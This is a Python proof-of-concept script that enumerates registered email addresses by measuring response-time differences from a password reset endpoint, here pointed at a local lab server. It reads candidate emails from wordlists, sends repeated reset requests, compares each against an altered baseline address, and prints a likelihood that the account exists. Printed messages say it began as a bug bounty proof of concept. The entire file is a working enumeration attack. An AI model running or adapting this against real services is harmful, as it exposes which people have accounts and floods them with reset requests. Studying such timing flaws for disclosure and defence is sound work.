import time, random, requests


# Global Variables
AVERAGE = {
    
}

def avg( l ): return sum(l) / len(l)

def leetify( email ): 
    #
    #   Change Email address into a one that's most likely non-existing.
    #
    deconstructed = email.split( "@" )
    
    # Email should be as long as the one we're testing.
    # Longer emails take longer in the query from the DB.
    reconstructed  = deconstructed[ 0 ] + "@"
    reconstructed += "1" + deconstructed[1][1::]

    return reconstructed



#
#   Reset password 
#
def send_reset_password( email ):
    url      = "http://172.17.0.2:5500/reset"
    _headers = {}
    
    response = requests.get( 
        url,
        params = { "email" : email },
        headers = _headers,
    )
    
    return response


def test( email ):
    global AVERAGE

    # Get Latency of the request.
    start    = time.time() * 10_000
    response = send_reset_password( email ).status_code
    stop     = time.time() * 10_000
    
    # Check if API acceptes PASSWORD_RESET
    accepted = (response == 200  )
    if not accepted:
        print( f"[!] Password reset not accepted by backend for {  email }. This means measurement can be invalid. Details:" )
        print( response )

    # Store results per target tested
    if email not in AVERAGE:
        AVERAGE[ email ] = list()
    
    AVERAGE[ email ].append( stop - start )
        
    # Timeout to prevent problems
    time.sleep( 1 )
    
    
def main():
    emails = []
    
    #
    #   Add in_database emails
    #
    c = 0
    with open("../db_locally/wordlists/in_database.txt", "r") as file:
        for line in file.readlines():
            email = line.strip("\n")
            emails.append( email )
            
            # Only take 5
            c += 1
            if c == 4:
                break
    
    
    #
    #   Add not_in_database emails
    #
    c = 0
    with open("../db_locally/wordlists/not_in_database.txt", "r") as file:
        for line in file.readlines():
            email = line.strip("\n")
            emails.append( email )

            # Only take 5
            c += 1
            if c == 4:
                break

    
    #
    #   Testing process
    #
    iterations = 5
    random.shuffle( emails )
    for email in emails:
        baseline = leetify(email)
        
        print( f"[+] Measuring latency for email { email }" )
        for _ in range(iterations):
            test( email )
            
        print( f"[+] Measuring baseline for email { email } using { baseline }" )
        for _ in range(iterations):
            test( baseline )
            
            
    #
    #   Results of the tests
    #
    print( "\nThis script was originally a POC for the [REDACTED] bug bounty.")
    print( "Because latencies in the prod env were more tightly together, likelihood % was between 0.5 & 3.0.")
    print( "Here, the differences are much greater, to aid noticing which emails are in the db. \n\n" )
    print("[?] Results:")
    print( "\nEmail,tested,baseline,likelihood" )
    for email in emails:
        
        tested   = avg(AVERAGE[ email ])
        baseline = avg(AVERAGE[ leetify(email) ])
        
        rounded_tested   = round(tested,   0)
        rounded_baseline = round(baseline, 0)
        
        print( email, " "*(40 - len(email)), rounded_tested, rounded_baseline, "\t\tlikelihood: ", round( rounded_tested / rounded_baseline, 2 ) ) 
        
    print("\nTreshold depends on a multiple variants, so compare likelihood against other tested emails too.")
    print("It seems safe to assume, however, that if 'likelihood' is greatly >1, the email is registered.")
    print("Larger likelihood values indicate it is more likely that the email has been registerd.")

    
    
if __name__ == "__main__":
    main()
